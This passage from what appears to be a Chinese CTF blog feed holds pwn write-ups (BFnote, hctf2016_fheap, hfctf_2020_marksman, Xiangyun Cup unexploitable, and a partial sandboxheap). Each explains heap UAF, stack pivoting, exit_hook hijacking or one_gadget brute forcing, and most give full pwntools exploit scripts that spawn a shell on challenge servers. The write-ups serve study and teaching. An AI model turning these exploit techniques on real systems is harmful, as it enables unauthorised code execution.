id="EXP">EXP</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26281&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x0804882A</span>,<span class="number">0x08048907</span>,<span class="number">0x080487BA</span>,<span class="number">0x8048973</span>)</span><br><span class="line">leave_ret=<span class="number">0x08048578</span></span><br><span class="line">inc_ebp=<span class="number">0x08048434</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x32</span>+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x0804A060</span>+<span class="number">4</span>)+p32(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\nGive your description : &quot;</span>,payload)</span><br><span class="line">payload=p32(<span class="number">0x080489db</span>)+p32(<span class="number">0x804a02d</span>+<span class="number">0x17fa8b40</span>)+p32(inc_ebp)*<span class="number">0xd9</span><span class="comment">#0xdb</span></span><br><span class="line">payload+=p32(e.plt[<span class="string">&#x27;read&#x27;</span>])+p32(<span class="number">0x08048656</span>)+p32(<span class="number">0</span>)+p32(e.got[<span class="string">&#x27;atol&#x27;</span>])+p32(<span class="number">0x100</span>)+p32(<span class="number">0x08048656</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give your postscript : &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\nGive your notebook size : &quot;</span>,<span class="built_in">str</span>(<span class="number">0x50000</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give your title size : &quot;</span>,<span class="built_in">str</span>(<span class="number">0x5170c</span>-<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;invalid ! please re-enter :\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\nGive your title : &quot;</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give your note : &quot;</span>,p32(<span class="number">0xdeadbeef</span>))<span class="comment">#canary</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">&quot;\x40&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281741828.png" alt="image-20221128174103440"></p><h2 id="参考文章">参考文章</h2><p><a href="https://www.cnblogs.com/countfatcode/p/12425168.html">i春秋公益赛之BFnote - countfatcode - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈迁移 </tag>
            
            <tag> 篡改got表 </tag>
            
            <tag> 篡改TLS中stack_guard </tag>
            
            <tag> 绕过canary </tag>
            
            <tag> magic gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hctf2016_fheap</title>
      <link href="/posts/f50f2cd6.html"/>
      <url>/posts/f50f2cd6.html</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面">写在前面:</h3><p>本题为一道经典的控制堆块的题目，对于这类题目通常的方法是将控制堆块申请出来当做用户堆块来使用，向其写入特定数据来篡改其中的函数指针。</p><h3 id="保护策略：">保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211122218987.png" alt="image-20221112221838443"></p><h3 id="程序分析：">程序分析：</h3><blockquote><p>一个堆块A中记录了另一个堆块B的地址，而show、edit、delete函数是通过访问堆块A中的堆块B的地址来进行相应的操作，我将这类堆块A称之为控制堆块</p></blockquote><p>本题只有add和delete函数，而delete函数的释放堆块处是通过控制堆块中存放的free函数的指针来实现的。分析add函数后，可以知道控制堆块的结构如下:</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211122227841.png" alt="image-20221112222749786"></p><p>本题的libc版本为2.23，存在的漏洞为UAF，程序所申请的控制堆块最终的大小是0x30.</p><h3 id="利用思路：">利用思路：</h3><p>通常对于控制堆块相关的题目(要存在UAF漏洞)，我们首先考虑能否将控制堆块给申请出来，通常的策略是将两个控制堆块给释放掉，然后申请一个和控制堆块等大的堆块，加上一个控制堆块，这样原本的两个控制堆块就全出来了，因为UAF漏洞的原因，我们可以往刚申请出来的用户堆块中写入数据(而它还是另一组堆块中的控制堆块)，从而篡改控制堆块中的函数指针。</p><p>注意：</p><ol><li>首先我们申请堆块的大小是由输入字符串的长度来决定的(如果出现了00会把strlen函数给截断)</li><li>申请堆块时，给bss段存的是控制堆块的地址。而这个索引的分配是选择了当前第一个空闲的标志位为0的堆块地址进行分配。举个例子如果我先申请了堆块A和堆块B，然后释放掉堆块A的话，再次申请一个堆块，该控制堆块的地址会覆盖原本堆块A的控制堆块**(而非因为UAF，在堆块B之后分配一个新的地址)**</li></ol><p>综上所述，我们做如下布局:</p><p>申请堆块A和堆块B(由于输入的数据小于0xf，因此不会创建出来用户堆块，此时堆块A和堆块B为控制堆块)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211122343486.png" alt="image-20221112234354615" style="zoom:50%;" /><p>接着我们申请出来一个与控制堆块等大的堆块(如下)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211130852198.png" alt="image-20221113085209676"></p><p>因此我们可以控制0x555555759030这个堆块里的函数指针(因为它位于bss段，所以还可以被当做控制堆块使用)，原本堆块中就残留了一个函数地址，我们修改后两个字节(爆破半个字节)，写入puts函数的plt地址。来泄露程序基地址(puts函数执行时会将0x18个a以及后面的puts的plt地址全部打印出来)</p><p>此时的payload为:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x4990</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>而之后的操作，全都如法炮制。去劫持函数指针进行篡改，先泄露libc地址(改函数指针为printf函数的plt表，利用格式化字符串漏洞来泄露libc(只控制printf函数的第一个参数即可))，再控制函数指针为system地址，参数给一个/bin/sh;即可。 使用/bin/sh;而没有使用/bin/sh\x00的原因是因为避免字符串中间出现00使字符串被截断。</p><h3 id="EXP">EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;3.quit\n&quot;</span>,<span class="string">&#x27;create &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Pls give string size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;str:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;3.quit\n&quot;</span>,<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Pls give me the string id you want to delete\nid:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Are you sure?:&quot;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x4990</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,payload)</span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xCED</span>,<span class="number">0xCC2</span>,<span class="number">0xE93</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">    base_addr=leak_addr-<span class="number">0x990</span></span><br><span class="line">    log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;%21$p&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>-<span class="number">5</span>)+p64(e.plt[<span class="string">&#x27;printf&#x27;</span>]+base_addr)</span><br><span class="line">    add(<span class="number">0x60</span>,payload)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x78c0f</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;/bin/sh;&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(sys_addr)</span><br><span class="line">    add(<span class="number">0x60</span>,payload)</span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">1</span>)   </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27051&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211130916753.png" alt="image-20221113091621333"></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UAF </tag>
            
            <tag> 控制堆块 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hfctf_2020_marksman</title>
      <link href="/posts/8cbdee5a.html"/>
      <url>/posts/8cbdee5a.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结：">总结：</h2><p>通过这道题的学习与收获有：</p><p>1、atol函数放入的数据应该是打包之前的，而非是打包之后的数据</p><p>2、exit函数执行流程，<strong>exit函数的调用流程exit函数—&gt;run_exit_handlers函数—&gt;_dl_fini函数—&gt; rtld_lock_unlock_recursive指针</strong> 如果我们能够将最后的指针所指向的内容修改为one_gadget，那么即可获取shell。这个劫持exit_hook的可取之处在于，程序正常结束的话，最后都会调用这个exit函数</p><p>3、学会了重新绑定程序所对应的libc动态库（patch libc和ld）</p><p>4、用这个方法可以在开了PIE的程序中下断点。gdb.attach(p, ‘b * $rebase(0xd63)\nc’)</p><p>5、one_gadget加上参数-l2可以搜索更多的one_gadget。</p><p>6、即使相同的libc库，在小版本不同的情况下，某些内容的偏移也是不一样的。</p><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220323150533922-178897691.png" alt=""></p><h2 id="题目分析：">题目分析：</h2><p><img src="../img/2706180-20220323150546195-1370770969.png" alt=""></p><p>代码很少，漏洞也比较明显，我们可以控制v6的值，以及v7[j]。并且在printf函数中，<strong>程序自己打印了Puts的真实地址，就相当于我们已经拿到了libc基地址</strong>。</p><p>也就是任意地址任意写。这里跟踪一下汇编代码，是怎么实现上述的任意地址任意写的。</p><p><img src="../img/2706180-20220323150556091-1654120866.png" alt=""></p><p><img src="../img/2706180-20220323150609387-735205154.png" alt=""></p><p>根据上面两幅图片，可以发现，<strong>最后的具体实现是mov [rax],dl这部分实现的。而rax最后溯源发现是sub_B78函数的返回值。</strong></p><p>可以看见这个sub_B78的返回值就是atol函数的返回值（这个函数是有坑的，下面会说到）</p><p><img src="../img/2706180-20220323150619184-1813218470.png" alt=""></p><p>dl就是edx的最低字节。<strong>注意，mov [rax],dl []会去rax里面寻址，也就是说我们修改的内容应该被rax所指向。简单来说就是rax必须是个指针，而这个指针指向我们要修改的内容（而不能把rax寄存器里面直接放成我们要修改的内容）</strong></p><p>值得一提的是，sub_bc2这个函数存在的目的就是去限制我们的one_gadget</p><p><img src="../img/2706180-20220323150630708-1754089244.png" alt=""></p><p><img src="../img/2706180-20220323150641484-1764129240.png" alt=""></p><p>如此，我们现在有两种方法，<strong>要么使用one_gadget参数l2，去找寻更多的one_gadget（只不过使用条件可能更苛刻），还有一种方法是将one_gadget地址减5，以此来绕过检查</strong></p><p><img src="../img/2706180-20220323150651359-2138009206.png" alt=""></p><p><img src="../img/2706180-20220323150701120-590746669.png" alt=""></p><p>可以发现libc基地址只有后一个字节是00，倒数第二个字节并不完全是0，因此我们减5的话，将one_gadget指令抬高一个指令，这样最后一个字节绕过了检查，而倒数第二个字节加上libc基地址之后，也可以绕过检查。</p><h2 id="做题思路">做题思路</h2><p>这道题明显看出来也没机会再传参了，那就考虑one_gadget（我们是知道libc基地址的）。由于还可以任意地址任意写三字节，我是优先考虑的修改函数got表，<strong>但是很快就会发现程序是开了PIE保护的。got地址并不是固定的</strong>，同时我们还泄露不了栈地址，因此这个方法就被我打消了。但是我们是知道libc基地址的，因此我们现在的思路是想办法去libc里面找个指针（这个指针还必须指向一个被执行的地址），然后通过这个指针将one_gadget写入指针所指向的地方，最后获取shell。</p><h2 id="关键知识点">关键知识点</h2><p>通过调试发现了有三个地方都具备这样的指针。</p><p>①puts函数调用了__strlen_sse2</p><p><img src="../img/2706180-20220323150714090-172999789.png" alt=""></p><p>此时该函数已经在我们的动态库里面了，并且<strong>再次jmp到 rip+0x3c9f12所指向的地方</strong>，那我们只需要以rip+0x3c9f12的地址作为跳板，去将它所指向的地方最后三字节修改为onegadget即可（由于libc中的地址都是以libc基地址加偏移来寻址，这个偏移就占最后的三字节（前面的基地址大家都一样，因此只修改三字节即可）。</p><p><img src="../img/2706180-20220323150723849-815330213.png" alt=""></p><p>要修改的地址距离libc基地址偏移为0x3eb0a2</p><p>②   dlopen函数—&gt;_dlerror_run函数—&gt;_dl_catch_error函数</p><p><img src="../img/2706180-20220323150734638-471411632.png" alt=""></p><p>这里原理同上，此时跳到了rip+0x2022a2<strong>所指向的地方</strong>。</p><p><img src="../img/2706180-20220323150747907-243602693.png" alt=""></p><p>要修改的地址，距离libc基地址偏移0x5f4038</p><p>③也是我想重点讲的exit hook劫持。</p><p>exit函数的调用流程exit函数—&gt;__run_exit_handlers函数—&gt;_dl_fini函数—&gt; _dl_rtld_lock_recursive指针（这是个结构体指针变量）</p><p><img src="../img/2706180-20220323150757504-1460403787.png" alt=""></p><p>而_dl_rtld_lock_recursive这个指针又指向了 __rtld_lock_default_lock_recursive</p><p><img src="../img/2706180-20220323150807027-834730342.png" alt=""><br><img src="../img/2706180-20220323150832405-1323272271.png" alt=""></p><p>可以看到最后又执行了这个 __rtld_lock_default_lock_recursive</p><p>因此我们就把这个_dl_rtld_lock_recursive指针当做跳板，去将它指向的内容（__rtld_lock_default_lock_recursive）也就是修改为one_gadget。</p><p><img src="../img/2706180-20220323150844014-384704368.png" alt=""></p><p>因此这个rtld_lock_default_lock_recursive指针距离libc基地址的偏移为0x81df60。</p><p>这里我因为libc的版本卡了很久，原先我那个也是2.27，不过好像是小版本不同，最后得出来的偏移和服务器那边版本的偏移差了0x1000。</p><h2 id="patch-libc和ld过程">patch libc和ld过程</h2><p><a href="https://blog.csdn.net/qq_41560595/article/details/114597342">https://blog.csdn.net/qq_41560595/article/details/114597342</a></p><p>这篇文章很详细的记录了patch libc和ld的过程。</p><p>我根据这篇文章再做一点补充</p><p>想要下载某个版本的libc时，先cat list（此时应该先看上面那篇文章，先下载下来glibc-all-in-one</p><p><img src="../img/2706180-20220323150858134-535564640.png" alt=""></p><p><img src="../img/2706180-20220323150907265-2010357906.png" alt=""></p><p>./download去下载下来你想要的libc版本（这道题应该选上图的这个版本）</p><p><img src="../img/2706180-20220323150916892-736455012.png" alt=""></p><p>然后上面那篇文章中，这几个红色框的部分，是根据自己的路径来配置（别傻傻的全复制粘贴了）(不是红框的，一律不用改）</p><p><strong>这样做的好处就是，本地程序所依赖的libc库和远程的libc是一样的，这样拿到的关于libc基地址的任何偏移本地与远程就都是一样的了。</strong></p><p>如果遇见下面这种报错的话<br><img src="../img/2706180-20220403102819721-1715294586.png" alt=""><br>在下载完patchelf之后，进入patchelf的目录，用下面这个命令安装一个工具：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install autoconf automake libtool</span><br></pre></td></tr></table></figure><p>然后再输入</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">make check</span><br></pre></td></tr></table></figure><p>之后就ok了。</p><h2 id="再说关于atoi函数的那个坑。">再说关于atoi函数的那个坑。</h2><p>结论</p><p><strong>遇见atol函数的时候，要发打包前的数据，而不是打包后的数据</strong></p><p>因为传给atol的参数会被遇见第一个不是0~9的字符所截断 从而返回之前的值，举个例子，你想打包的数据是1234，那么被打包之后就是\x04\x03\x02\x01，这些都是不可见字符，传入atol之后直接就被截断，导致atol返回值为0，使得后续的流程是错误的。</p><p><img src="../img/2706180-20220323150926759-1085603692.png" alt=""></p><p>exp</p><p>打远程</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27125</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0xd63)\nc&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ggg=libc_base+<span class="number">0x81df60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ggg))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sss=<span class="built_in">str</span>(ggg)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shoot!shoot!\n&quot;</span>, sss)</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f322</span>-<span class="number">5</span></span><br><span class="line"><span class="comment">#list=p64(one_gadget)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(one_gadget &amp; <span class="number">0xff</span>))<span class="comment">#chr目的是将16进制转化成一个字节发过去</span></span><br><span class="line">    one_gadget = one_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打本地</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0xd63)\nc&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;xiamian&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">strlen=libc_base+<span class="number">0x3eb0a8</span><span class="comment">#这里我最开始调试得到的偏移是这个0x3eb0a8（当时我用的是本机自带的libc）,然后patch另一个libc之后，就变成0x3eb0a2了（我最开始用0x3eb0a8是打通了的）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(p64(puts_addr))</span><br><span class="line">sss=<span class="built_in">str</span>(strlen)</span><br><span class="line">p.sendline(sss)</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe54fe</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(one_gadget &amp; <span class="number">0xff</span>))</span><br><span class="line">    one_gadget = one_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>如果复制粘贴还打不通的话，九成九是libc版本的问题（本人就一菜鸡，如果写的哪有问题，欢迎指正）。</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> 劫持exit_hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022_祥云杯_pwn 部分wp</title>
      <link href="/posts/30a1c326.html"/>
      <url>/posts/30a1c326.html</url>
      
        <content type="html"><![CDATA[<h2 id="unexploitable">unexploitable</h2><h3 id="保护策略：">保护策略：</h3><img src="../img/image-20221029152901840.png" alt="image-20221029152901840" style="zoom:50%;" /><h3 id="利用思路：">利用思路：</h3><img src="../img/image-20221029153046424.png" alt="image-20221029153046424" style="zoom:50%;" /><p>因为程序仅仅有一个read函数，没有canary，而且溢出的字节非常大，所以本题可以随便溢，但问题是没有后门函数，并且没有输出函数。在开了PIE的情况下，很多花活是没法用的。</p><p>通过调试发现，在main函数返回到libc_start_main函数的时候，该地址是一个libc地址，而让执行流跳到一个地址就能get shell的地址只有one_gadget。通过用set命令更改内存的值为one_gadget，发现第一个one_gadget就能用(如下)</p><img src="../img/image-20221029153558694.png" alt="image-20221029153558694" style="zoom:50%;" /><p>于是思路就是将libc start main的后三字节，改为one_gadget地址(由于libc地址后三位是固定的，所以我们需要爆破前三位，概率为1/4096)。</p><p>但如果我们单纯的填垃圾数据，然后溢出篡改的话，情况如下</p><img src="../img/image-20221029154216496.png" alt="image-20221029154216496" style="zoom:50%;" /><p>即使我们溢出篡改了libc_start_main,也会返回到它上面的地址，所以我们需要让执行流滑到libc_start_main上，开了PIE保护，我们无法直接获取ret指令的地址，但是vsyscall的地址始终是固定的，它可以当做ret指令来用。</p><p>所以我们把上图的0xdeadbeef改成vsyscall的地址即可，执行到vsyscall的时候就可以往下滑到爆破成功的one_gadget，从而获取shell。</p><h3 id="EXP">EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffff600000</span>)*<span class="number">2</span>+<span class="string">b&#x27;\xa5\x22\x06&#x27;</span></span><br><span class="line">    <span class="comment">#debug(p)</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">    a=p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&quot;101.201.71.136&quot;</span>,<span class="number">41614</span>)</span><br><span class="line">        <span class="comment">#p=process(&quot;./unexploitable&quot;)</span></span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221029155442239.png" alt="image-20221029155442239"></p><p>hhhh，运气不够，终端来凑，开了12个，爆了六七分钟。</p><h2 id="sandboxheap">sandboxheap</h2><h3 id="保护策略：-v2">保护策略：</h3><p><img src="../img/image-20221030114249283.png" alt="image-20221030114249283"></p><h3 id="沙箱分析：">沙箱分析：</h3><p>因为本人比较菜，第一次见到题目给的这种沙箱文件，再加上比较好奇，就研究了一番，大致的分析过程如下：</p><p>通过查阅资料发现ptrace(PTRACE_GETREGS, child_pid, NULL, &amp;regs)的第四个参数是&amp;regs，而这个regs是在ptrace.h定义的一个结构体user_regs_struct(用来保存各个寄存器的值)，我们再去看下IDA里的伪代码(如下)，发现第四个参数是v8，因此判断v8就是user_regs_struct结构体</p><img src="../img/image-20221031093052357.png" alt="image-20221031093052357" style="zoom:50%;" /><p>所以我们去将v8的类型改成user_regs_struct(如下)</p><p><img src="../img/image-20221031093545472.png" alt="image-20221031093545472"></p><p>同时还可以看到由于v8确定为结构体后，里面的一些寄存器也在IDA中显示了出来</p><img src="../img/image-20221031093911118.png" alt="image-20221031093911118" style="zoom:50%;" /><p>这时候我们从头分析一下，fork的返回值给了v3，然后又把v3给v4.接着if(v3)，而fork函数会有两个返回值，原本的父进程会返回子进程的id,而子进程则返回0。所以接下来的if(v3)只有父进程(sandbox)能进</p><p><img src="../img/image-20221031094002359.png" alt="image-20221031094002359"></p><p>子进程返回的是0，所以触发else(如下)</p><p><img src="../img/image-20221031094347999.png" alt="image-20221031094347999"></p><p>第一行的ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)表示被父进程跟踪，任何信号(包括子进程中执行的syscall)都会暂停子进程，阻塞与wait()等待的父进程被唤醒。第二行的execvp则执行了a2[1]这个文件，a2则是命令行参数，这道题的沙箱自然是给sandboxheap开的，所以本题正确的运行方式应该是<code>./sandbox ./sandboxheap</code> ，这样子进程就调用了题目的附件。从而实现了个sandboxheap开了一个沙箱保护。</p><p>接着回到父进程那边，现在去看一下这个沙箱是怎么实现对某些系统调用的拦截的</p><p><img src="../img/image-20221031100404042.png" alt="image-20221031100404042"></p><p>在①的位置使用了ptrace(PTRACE_GETREGS, child_pid, NULL, &amp;regs)，此时子进程的寄存器信息会存储到regs结构体里，而在②的上面一行，去赋给了regs.rax为-1，然后执行②的时候，ptrace(PTRACE_SETREGS, child_pid, NULL, &amp;regs) 会将regs结构体里的值拷贝给子进程的各个寄存器，这样子进程的rax就变成了-1，当子进程去执行syscall的时候发现rax是一个无效的系统调用号，就会报bad syscall从而完成了拦截。</p><p>而我们要绕过沙箱的禁用，所以想办法不能被拦截下来。重新看一下规则，只要我们能保证这个位置的数值是0，那就不会被拦截下来(如下)</p><p><img src="../img/image-20221031101842345.png" 